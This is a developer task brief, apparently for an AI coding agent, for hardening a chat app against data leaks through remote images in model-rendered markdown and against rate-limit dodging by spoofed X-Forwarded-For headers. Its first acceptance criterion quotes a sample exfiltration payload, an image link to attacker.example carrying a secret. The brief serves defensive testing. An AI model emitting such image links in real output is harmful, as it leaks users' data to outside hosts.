# Brief 019 — Security hardening: remote images and per-client login limit (plan F4)

| Field | Value |
|---|---|
| Feature number | 019 |
| Branch | `019-security-hardening` (set `GIT_BRANCH_NAME=019-security-hardening` for `/speckit-specify`) |
| Spec dir | `specs/019-security-hardening/` |
| Worktree | `/home/rudolf/dev/wcl-worktrees/dev-b` (track B) |
| Base ref | `sprint-2026-10-25` tip (see `git -C /home/rudolf/dev/wcl-worktrees/sprint rev-parse sprint-2026-10-25`; the worktree is detached there) |
| Model / effort | sonnet / high |
| Shortcut stories | sc-157 (2), sc-158 (2) |
| Peer developer | `dev-a-018` (track A, `wcl_agent` restructure; it merges first, so rebase on it if it lands before you) |
| Scrum master | `scrum-master` (your only channel upward) |
| Plan | `/home/rudolf/dev/wcl-worktrees/sprint/sprints/2026-10-25/plan.md` (section F4) |
| Ownership ledger | `/home/rudolf/dev/wcl-worktrees/sprint/sprints/2026-10-25/ownership.md` |
| Decisions | `/home/rudolf/dev/wcl-worktrees/sprint/sprints/2026-10-25/decisions.md` |
| Source findings | `/home/rudolf/dev/warcraftlogs-agent/qa-reports/2026-10-18-2106/security.md` (SEC-003 and SEC-004; read only, in the owner's checkout) |

## Plan section (verbatim)

## F4 — Security hardening: remote images + per-client login limit (Track B, first)

- **Stories:** sc-157 (2) QA SEC-003: block remote images in model output; sc-158 (2) QA
  SEC-004: per-client login rate limit behind proxy.
- **Complexity:** low–medium.
- **Footprint:** `frontend/src/components/StreamMarkdown.tsx` (Streamdown `harden`
  options), `frontend/nginx.conf` (CSP and forwarded headers), `frontend/vite.config.ts`
  (dev proxy), `backend/app/api/auth.py` (`_source_key`),
  `backend/app/services/auth_service.py`, `backend/app/auth/rate_limit.py`,
  `backend/app/config.py`, `backend/Dockerfile` CMD, `docker-compose.yml`. Source
  findings: `qa-reports/2026-10-18-2106/security.md` SEC-003 and SEC-004, in the
  owner's checkout `/home/rudolf/dev/warcraftlogs-agent/qa-reports/`.
- **Depends on:** nothing. Disjoint from F1.
- **Acceptance criteria:**
  1. Markdown in chat replies and guides never makes the browser fetch a remote image.
     `![x](https://attacker.example/?q=secret)` renders as a plain link or a "remote
     image blocked" placeholder, and no network request goes out. A frontend test
     covers this (renderer config, or a rendered-output assertion).
  2. The app's own images keep working: background art, Plotly artifacts, and any
     same-origin, `data:` or `blob:` images the app produces.
  3. `frontend/nginx.conf` sends a Content-Security-Policy whose `img-src` is limited to
     `'self' data: blob:`, and which doesn't break the app (check script, style, font
     and connect sources against the running app, including the WebSocket and Google
     Fonts if used).
  4. Links in model output stay clickable, for `http(s)` only.
  5. Behind the trusted proxy, the login and token-endpoint limiters key on the real
     client IP. Uvicorn runs with proxy headers on and a configurable trusted-proxy
     list (a setting with a safe default, documented in `.env.example` or the README).
     nginx and the Vite dev proxy forward the client address.
  6. Backend tests: two clients with different forwarded IPs from a trusted proxy get
     separate buckets, so one locking out doesn't lock out the other. An
     `X-Forwarded-For` sent from an untrusted peer is ignored, so it can't be used to
     dodge the limit.

## Tentative footprint (becomes a grant after `/speckit-plan`)

- `frontend/src/components/StreamMarkdown.tsx`, `frontend/nginx.conf`,
  `frontend/vite.config.ts`, and a new frontend test file for AC 1.
- `backend/app/api/auth.py`, `backend/app/services/auth_service.py`,
  `backend/app/auth/rate_limit.py`, `backend/Dockerfile` (CMD), `docker-compose.yml`,
  `.env.example`.
- Tests: `backend/tests/test_auth_login.py` and `backend/tests/test_rate_limit.py`, or
  a new test file.
- **Ownership conflict to design around:** `backend/app/config.py`, `backend/app/main.py`
  and `README.md` are held by feature 018 (they reference `wcl_agent`). Prefer a design
  that doesn't need them. For example, uvicorn's own `--proxy-headers` with
  `FORWARDED_ALLOW_IPS` (default `127.0.0.1`) is a setting with a safe default,
  documented in `.env.example`, and it needs no new app setting (constitution III).
  Your plan makes the final choice. If you still need `config.py` or `main.py`, say so
  in your file list. You'll get them after 018 merges and you rebase on it.
- Frontend dependency changes need the `frontend/package*.json` token. Ask first if a
  test library is missing.

## Notes from the scrum master

- This is security-sensitive work. In the plan, state the trust model in one paragraph:
  which peer is trusted, which header is read, and what happens with a spoofed
  `X-Forwarded-For` from an untrusted peer and with multi-hop chains. AC 6 must test the
  spoofing case.
- CSP (AC 3): check the real sources the app uses (Vite build output, Google Fonts if
  any, the `/ws` WebSocket, Plotly) and list them in the plan. A CSP that breaks the app
  is a reject.
- For a live check of the CSP or headers, ask me for a port. Don't use the defaults and
  don't run `docker compose`.
- GitNexus `impact` on `_source_key` and the limiter functions before you edit them.
  Before hand-off, re-index **your worktree** and run `detect-changes`.
